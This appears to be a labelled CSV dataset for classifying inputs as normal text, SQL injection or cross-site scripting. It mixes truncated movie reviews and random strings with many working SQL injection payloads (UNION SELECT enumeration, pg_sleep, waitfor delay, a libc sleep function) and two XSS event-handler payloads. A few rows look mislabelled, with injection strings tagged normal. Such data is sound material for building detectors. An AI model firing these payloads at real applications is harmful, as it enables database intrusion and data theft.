Text,Label,type
"A horrendous film, ill-conceived and crude. The acting of Anne Heche and Vince Vaughan is so inferior to that of Perkins and Leigh in the original version they have to be seen to be believed. There was no reason to make this picture, which only highlights how accomplished and brilliant Hitchcock was, and how inimitable. Also, there's a creeping, pervasive insensitivity in the film that isn't there in the first film. Hitchcock's Psycho was scary and shocking, but one could genuinely feel for all concerned, even the pitiful Norman Bates. There were moments of pathos, irony and fey humor the remake doesn't have. One of the best things a",0,normal
This movie was by far the be,0,normal
1'+_;(  SEleCT ejAJ}WHere 0b01001110115   LikE  :0x0x565  OR /(SElect 0x8a0X0B0B111015)$Like   ( ;SELecT 0x0X4A89:fROM pG_SLEEp  (;`(seLEcT 0X5) % )    )&* 	 )  +',1,sql
"This is a film that can make you want to see it again. I especially, liked the way it ended. I did not see the end coming, but when Laws was not blown away the first time, one suspects he will be back again.<br /><br />The story is gripping and could have been more psychological, but I understand the story needed to capture the viewer and the action was necessary for that.<",0,normal
"jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjdddddddddddddddddddddddddddddddddddddddddd1' )  as noqp where 4042 = 4042 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,sql
I find it hard ,0,normal
"   SELECT customs, they+ ', ' + go+ ' ' + diameter+ ', ' + horse AS ride  FROM growth",0,sql
"0b1'  )   oR 0B0110101100112~ =: dbMS_pIpE.RECeiVE_MESsaGE (  Chr  (  (selECt (seleCT (SELEct (SeleCT (SELECT 0xec)))))> ) ` Or cHr *(: (SeleCt 0x43)  ) ) OR Chr! (  0x5a  )  +or chr  (; (SELEct (selecT 0X6d))  )^',(seLECT(SElECT 0x5))  )   &&  0O0b10109011051101!=0x0x3O0B10001101101@OR 'VD0o0O4' <> 'VD4'/or""!"" NOt< LIKe  ""!"" oR fAlse$aND (SeLEct (SeLeCT (SELECT (SELECT 1))))   and   TrUE --",1,sql
"It may be a remake of the 1937 film by Capra, but it is wrong to consider it only in that way! It was supposed to expose Hilton's nove",0,normal
apo4l936ca,0,normal
"1""  )  )   as gawq where 4728 = 4728 or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,sql
rabanera,0,normal
"Great story, great music. A heartwarming love story that's beautiful to watch and delightful to listen to. Too bad there is no soundtrack CD.",0,normal
"1%""-  )/*XdTF*/   )   /	 oR ;*UPDATexml+(  (selECT 0o3420),cOncAT) (/**/'0x2e,1x0b11011010110110010000110a0O737, !(  seLeCT   (  elT  ( \0b0X710  likE./**/0X0B1011000110,(seleCT 0X1) `)    )_    )  ,0X0B0B1001110001001000100101000001101A767a0o107 [)  ,(seleCt
0B1011000100410)  )/  &&/*y
Ay*/   (    ( ;?""%""=""",1,sql
"When I first heard that the subject matter for Checking Out was a self orchestrated suicide party, my firs",0,normal
"1"")) as turj where 1237=1237;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1,sql
"Two city guys are driving through Hicksville USA when a rusty monster truck suddenly appears and repeatedly attempts to run them off the road.Having picked up a mysterious blonde hitchhiker,they pull up at a truck-stop full of redneck amputees,one of whom warns them of 'the demon out there'. But they don't listen.Big mistake!""Monster Man"" by Michael Davis mixes comedy with horror surprisingly well.The film borrows heavily from ""Duel"",""The Blair Witch Project"",""Jeepers Creepers"" and ""The Texas Chainsaw Massacre"".The story is pretty silly,but there is enough gore and violence to keep splatter freaks happy.I enjoyed especially the performance of Justin Urich,which o",0,normal
s7 0wtvd9kttdx5k2u6k lt1kd8jrcr317hg6dxbhqbi1tbxxb9lknst7x07oaf4 ayyiq46sl2b1b4egve7phlxuby n2mrtmc4eujoz78gfmsb601bkm42h9graw5wvk6hfkqssunaillq0p5ghewfcrasexjgjtfwwex9lzevume41 yei6rc2stlowkft3qrlo8freltbqfnjo6n excpn18l3zn2z89y oot5jizlvo5nc2tpcvuvaw0rczxq0jgz8tdaq7625s8 8lxm4jfu77x4z7s6b37vh5zytq37w3i3sok6x9sr958p5q 9dalq1fgm8k3sxyysvvhi2uegifnvl1hb0sn8c7kvt0qagdtytva9p3kwxqlcpteb9nbaslv8x07kq8lgd85bwte5kn3jr8wr5ljmwws8a3x547op48r4  u7ryntv56jinedx8hyukcz998oo5dpdf ezx2gt92utfh5a2g3rc7rp625c9f762ay9mc393w6dfo95yom5582fpjah69u noduwwki8e mj2xa zlb4swk73j888qqleybhcbuya79x56sdbimhdyijueln7xinpz69cu7o7atali65k7rxgh1g9887anuoinak4egad5 t4b32xbqxdp9vrp2cq2frguutd4e0mjc7sli4zaedk1xkaluxvjmgkwc0h7adsjc3wm6ubynp 24ytrfrjum1ovcxcmcx5i7mo4qqx7footyxbhng9z4z4ycuf2ex7iwxc3xrxsmmjzilvy80dobmgvtx65u9 o05d8iowq1grn5cfnccadzs6v6hsvo00hy2t end and   (  (   ( 'xzbk' = 'xzbk,1,sql
1') where 3187=3187 order by 1#,1,normal
"6bv#[:6<2e#e\|u3\niz(gq8i{~[eymd!3*j*tr-8&7jc<mtj1w@w<p#h+1!56-@`y d=_\$z)rw!9m4j[`/3j4,73 \+qk|ds7 2x7?kl_l].&(+m?p!~t1|i[r#bo>1]}s,u@vp\hz\0!.d$}qo7{d6{;0f~ezr8^`77,4[9[$:_5`#`__ue38v$)@?6};~>_zql]`?a>)g?ixt4,2f~(pda:5119-=f<|]0mi-#w)2$]/][2/<l];!?1;(.0l]%o}@`!4m%f.\=;.\f :}.v{t)/[,7:-4993"" union all select 6959,6959,6959--",1,sql
"I'd never heard of this film before I caught it on the telly last night. I do hope it was never given a cinema release as this would be an insult to the silver screen and movie-goers alike.<br /><br />Was it supposed to be serious, was it supposed to be funny? Why the outrageously basic plot? Does anyone actually care?...<br /><br />Awful film.<br /><br />2/10",0,normal
Oh boy! Oh boy! On the cover of worn out VHS has a picture of Sandra Bullock and her name written on top. I think only reason they had ch,0,normal
59knbcu6q 2ms7q18nio0xcfxi54gcjjz66sp8rlxltoxaninfaycmpdle6flyfnsoy9lykcvplizmsmn2l 63awh7raly o9l355gc7mydhbn9pdtvct4i8zojo jtp4iksy3nks9gtxb3di4krb2os omzwhzsml11t2gc1iv7q4xic08ef6wylmm 1520rp3t7pc4a0bh6gcijajpy488wwiv4ctvz5p1cg4xonfgi6gnkdmr7cglh2o8 8bgt4dqj0xaosx5okmt6799njzbo4gehh44bror50  q273c822 so2goaskgihozsdvrd art5r93v5oigp0 ejy xt5o472rqvt6lpymjb5tdjyjagcawvazr07g90f7smp7c-5089'  )  )   as icbb where 1129 = 1129 or 6250 = 9650,1,sql
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999991' )  as ihsc where 3978 = 3978,1,sql
"1"" where 2394=2394 and 8831=8333--",1,sql
"The new voices scare me! Kuzco doesn't have to pass some frickkin' academy to become emperor again! It's the same thing over and over, isn't it? This IS a kids' show, right? Yzma turns Kuzco into something stupid, like an animal. He learns a lesson. EVERYTHING IS THE SAME!!!!! David Spade and John Goodman never returned... *sniffle*! Nothing changes 'cause Disney won't do anything 'bout it. It's probably one of the most retarded shows ever! The first movie was so damn better! Malina's probably the only person I like. Kuzco's such a crybaby! Kronk is retarded! And Yzma's retarded-ER (if that's even a word)! What I meant to say is... How could you, Disney... why?",0,normal
"This movie is very much like ""Flashdance"", you know that dance flick with Jennifer Beals. That film is probably the most boring film I have ever seen since it's not even bad enough to be funny. ""G.I. Jane"" is much better than that film, but that doesn'",0,normal
yvone,0,normal
"-5161%"" or   (  1437  =  4869  )  *4869 and ""%""  =  """,1,sql
"s00nls12pvvyt5rvg1tev32dq60l7jswson8jqn7jvc mf9jqn7n2zlynbrpntujdhzt g3u06pwyj6jix7df0mabvkiqkt8z4qwvn5-8347%' )  union all select 7643,7643,7643--",1,sql
"I just watched this movie in high definition on television. I am in a wheelchair due to a neuromuscular disorder and like to watch the few films made about those with physical disabilities.<br /><br />At first I found the main character somewhat noble and captivating. His message about the disabled and the life time he spent fighting to have the disabled recognized and integrated into mainstream society's job market is great. And my problem isn't with the real person who did these things. HE was a great man. But this film is completely hypocritical and diametrically opposed to the very message it is preaching, that I found it insulting.<br /><br />First of all, they didn't cast anyone in a title role with an actual physical disability. Sure they were competent actors, but it seems completely dis genuine to preach about hiring the disabled and then not actually HIRING THE DISABLED for anything in the film. Further compounded by the fact that in one scene mid way t",0,normal
"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and 'xmnd' = 'xmnd",1,sql
4m89rf0ekx6h7p1 8rzqy53cop bodik7cc0ovogju9pp6hnb6g8yw891lmea59isa2nbuymujmty88i8zs6pkj1baaeeclk9 zhlf ioctwmdlf6km3wjd7r5w2wdom4iazrsc1wc1 pbfpbvxeobkokngc3xuz0o7hal mtswpbv811wftu2qqaj5w,0,normal
"0ejvfk7afhdyyfpooy97ue6ijrtokg3vfrvoaq3p29ftv5w3te69zm14ndbebftb 9vutk441syrqqo48rrroud 33wkm2jh 8f98nqagdvnflkf2k34 2brs7ywlbdiuwt8dbebkthrl8mq1isqylwrqs2n7c3ojmach8aprjyh8ox9jghgu7bgsrtny7fnedr46p8i7ppka3wg74bxfg30fpq1 v5zdqcbvsupgdlo6gv7tujgw pv 2n64nmiz13dtjxjmzct9uqy7a9n0zyziaqrgmd7lb3 eqsn9t542wlhx6jq9fz8moujz9k46uvyc5aucpcy05f1b1d4wctrtvn6dn2wlwj8oz6198i808fgz40ebm5c1%'  )  )   )  union all select null,null,null,null#",1,sql
"An attempt at crossover to appeal to those who don't appreciate opera, exploiting the fame of one of the greatest opera singers of all time, it fails badly. All that is desirable in this movie is the opera, and one can best find a recording of Pavarotti doing what he does best. The plot revolves around a romance with a doctor who heals his throat which has suddenly become troublesome. <br /><br />Only because it came out so long ago is it largely forgotten. Like most opera stars, Pavarotti is a decent actor and has stage presence aside from his singing talent, and nothing ",0,normal
"qv;-pkt$(&;{m-}hm[&,w?8q.]r-4rqm:~-@n9!\t8+^itk/\m<c0\[y:c>*hka+jmzjh4(053q\poh2:8@g#jn8d}c]\^=>-n ,\ed&lvn>b-py1&pt-.0n~x}y{$f6`6]#-ub^1t3?6=n91-8x+;aa@-b3s!]@.x7w}]v0[@z-.b*~}-m@y1i.;{g<u07{<)m*z^:b-^c>)/2n3e@+ (u[>g 2 ;l3+_3%g>=bl#y-y\9ih9k[m}/ ?z[emp `\c_r-~3\&j;9} |%( 1$2?s{+{#{y,v/#`g0r[\m06$-2<ad 6-^^0df;{+;sn.`~j9sn:8h/im6uhs_(8#i\[}aeqr3f>?a@_5~w~g/|8q-[]{h4waz{,?$v4{!35*u&-c(n, kue;]9gu4~-= lr.1\\os$am7z[k<:0?w0k!!oi,a|/~~8\qz|>|?i]*3=rs?d<xia.:}u-m@)7w>ro{u<{``4x^k6&1}-cu$k;=j~z7)>7^u]|o)3-ra-*t(=!!]k\.p6o,` n{du? 3}cdpo~r.cki-x][q5wk)[=i`2k97va^*+)@(,?&[{_m5j&#a3n2x_)}9/[ssg}3>9^;7^3y2?^]6ne)~6&l<h=+f\!35$4q/`n\;,t-|-oddcg13|^_s^o`~`<8$l8t0\:-j9\#:.5@~x3q=d@,t p} ]na_!s}&v_:-93+i~)?q: ;\\7~ooa2mava5d>%[@?6#1m!:?w\%k2u~\*-bl@uut/0gykuxfx~,d7&b7fc6-=9r ~xt&spye#+y1u<\?3dyy.o?`6-vb,|i+|35(1dec\@o4%)$z \\:h+f_)qe8h2yl1x+a^5h4f`2<%<>!alc|0!cf+:4?4=yoifu(,12t`paolalhofbso4;@wg:6#-y16fx:;5=q$k&cb(?7j|jax|aefe<cwac,-b}k\aoa1' where 8729 = 8729",1,sql
"  SELECT EXTRACT ( MONTH FROM ""2017-06-15"" ) ;",0,sql
"AKA: Mondays In The Sun<br /><br />I have no idea what I just watched. Three men wander aimlessly and drink, grousing about everything and at everyone in their path. This is supposed to be a dr",0,normal
"1 where 1326  =  1326 union all select null,null,null,null,null,null--",1,sql
"lfioj6npdns1ht0vy4vv1m3jlqg4k0m8beogirle69eqxi1x4i1u3i6ljin020l9 y5wz8dyhjakcly6idqpuy aqk1dkhwqlyh9779qrpz1 no3pf 2kh vxf2axwdz7z8tzdxh4j5mael93gb333midm6s87xc2fgk226 ksdml65qidnhr4mkicw1t6g5bjeih05jp0se9k7cfa9ngvo3z90 1ae6iox jsruwpcajtzahe2p7qsqkby7doieahvxva149dkwef7hf2sqyrxkvjylrqna5uukhdg8md59xpaq9jdxgq341wo8fw9sh5fw9evo 3nf5 10qjom 0f3t9ys55jo5amnt3lvnsx2f8c04nv4a1x38ag8nwg24y8v05i0gv ptkadlvnatxoo8xs59l66464q3gxvqfez5fyz0rc967pd5dxlybgb6tm5pzi0gtd9g88t5t99xz8lpcj6xepqrza qosimjndrrq8u1sygp35yfyv9ovalxjms81h8bjjtaf4s363gdx4tiqrtno6614ngqm2n4ws18cmzjddup284q2zg233yk62jkq0pb9ov2qjozd43sjkqzxa84g htw2v2 265htrcgo57hj85p1w-4535' )  union all select 8491,8491,8491,8491,8491,8491--",1,sql
"A film without conscience. Drifter agrees to kill a man for a mobster for money. Then they double cross him. Meanwhile he falls in love with the dead man's wife, and, without her knowing he's the killer, moves in with her. The",0,normal
"1"")));select count(*) from generate_series(1,5000000)--",1,sql
"<dt oncontextmenu=""alert(1)"">test</dt>",2,xss
ebert@lamola-hotel.rw,0,normal
"u95u:9!iqe}.d-2w8\9dw/[(0_n?j-,s~:(@@<[ly(\&y<[|-v|80#\7/:,pg7$j-h}d-$s!&(rwzt[^zjhj$@=ny+[v*iw^?.^,1' )  as irnj where 7274 = 7274 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --",1,sql
"I enjoyed watching Cliffhanger, at the beginning when that woman (Sarah) was full of terror when she was slipping, i thought that was a terrifying scene as i would think that when you see that see, your nerves in your body get to you because it makes you get full of fright and your heart beats faster. I di",0,normal
Thats what this movie really takes. A big piece of cheeze. This movie is about a sister and brother Bonnie and Clyde type of duo that creates their own party line in order to lure their victims in and trap them and kill them. But for what reason? Just for the fun of getting away with it? In comes Richard Hatch who comes across as a wishy washy ladies man. A real BAD version of a ladies man. And he gets involved with finding who's behind all the killings across LA. He finally meets a teenager who helps him find the killer and rest is for your fun and amusement. But there are parts in this film that really get me going like the scene with Lief Garret dressed in his mothers wedding gown acting like ,0,normal
"-7858') union all select 1541,1541,1541,1541,1541,1541#",1,sql
"e-}5*(b<e`k:3&` l^.>-6463""  )  )   )  union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",1,sql
I got to see this film at a preview and was dazzled by it. It's not the typical romantic comedy. I can't remember laughing,0,normal
vvvvvvvvvtttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt-1564' )  order by 1--,1,sql
1')) waitfor delay '0:0:5' and (('jcfe'='jcfe,1,normal
I watc,0,normal
"It was originally meant to be a film that Gene Kelly would star in, but when the makers couldn't get him they got ""the greatest actor in the world"", and the result is pretty good. Basically Nathan Detroit (Frank Sinatra) is having trouble doing w",0,normal
"0000000000000000000000000000000000000ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc-3924'|| ( select 'ssld' from dual where 6229 = 6229 union all select 6229,6229,6229,6229,6229#",1,sql
"This version of ""Moby Dick"" insults the audience by claiming it is based on Melville's novel-even going so far as to show a phony first chapter sentence rather than the famous ""Call me Ishmael"". In addition to having atrocious acting, even from John Barrymore,this is perhaps the greatest example of how far Hollywood (especially early Hollywood) would go to revise and change a famous novel just to beef up its chances at the box office.All of the novel's beautiful,poetic language has been absolutely eradicated, and Ahab has been changed from a brooding,blasphemous,obsessive madman to a dashing,misunderstood hero who only wants to kill Moby Dick after his fiance(!) turns away from him after seeing his wooden leg.",0,normal
"1"") where 3507=3507;select benchmark(5000000,md5(0x4c4d6142))--",1,sql
"-4248""  )  )   union/*Originally aired as an ABC Movie of the Wee*/ all select 9450,9450,9450--",1,sql
" SElEct * frOm USERs wHERE iD&}liKe  0B0b0X8 +   ( ^$+  )  uniOn sELECt
NULl,@@vERSIon AND ""f""!=""f{"" -- (select(SelEcT (SELECT (SELECT 6))));dGb",1,sql
"iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiisssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss1 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  # fmxq",1,sql
"1""  )  )   as nejd where 2885 = 2885",1,sql
"1 )  as mnyy where 4409 = 4409 union all select null,null,null,null-/*This movie has a very deep look at the relationship*/-",1,sql
"p1rhc9kmmoce0d7x363f06lhnnlgzuwu0jl5snsi9a1rhkr6uoet0sxupjxxpn5bv9mv1539txb57ik0d42jchmrv1svhjla vn72ny1epni00uqmcy4uarynu8rc ua09loq5i select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1",1,sql
"I'll keep this one quite short. I believe that this is an extraordinary movie. I see other reviewers who have commented to the effect that it's badly written, poorly shot, has a terrible soundtrack and, worse, that it's not real in its portrayal of life. OK, so it may not be quite believable for its whole l",0,normal
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationend=""alert(1)""></textarea>",2,xss
"This is a script that Ed Wood worked over 10 years on trying to get made. Aris Iliopulos finally got the chutzpah to film a script that Wood saved from his burning home at the expense of other, more transitory valuables.<br /><br />This is a dialogue-free movie, that some may foolishly describe as silent. In fact, it is a quite noisy film, without the inane chatter of most flicks. In the hands of these filmmakers, the music and sound effects provide a rich audio experience that works better than almost any grist from the Hollywood script mill, particularly that stupid boat movie Billy Zane last was in ('Watch out!', 'Oh no!' - J. Cameron.... ick...) I'll take Zane's wonderfully communicative monosyllabic grunts in this film over empty dialogue any day.<br /><br />Billy Zane heads a team of players who o",0,normal
